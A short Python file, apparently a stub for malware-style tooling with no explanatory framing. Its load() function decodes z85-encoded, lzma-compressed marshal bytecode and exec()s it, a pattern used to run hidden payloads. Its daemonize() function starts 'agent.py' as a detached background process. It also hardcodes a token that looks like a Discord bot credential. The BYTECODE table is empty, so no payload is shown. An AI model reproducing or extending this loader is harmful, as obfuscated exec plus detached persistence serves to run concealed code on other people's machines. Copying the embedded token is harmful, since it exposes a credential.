import base64, lzma, marshal, subprocess
BYTECODE = {}
def load(name):
    compressed = base64.z85decode(BYTECODE[name])
    code = marshal.loads(lzma.decompress(compressed))
    exec(code, {})
def daemonize():
    subprocess.Popen(["python", "agent.py"], start_new_session=True)
TOKEN = 'MTQ4Mzc4NDM5OTQ3NTQ0MTY3NA.Gu6s4G.lT4FJrfy_rUUqqY2M8FDgcBuUqEPonalbHJdWE'
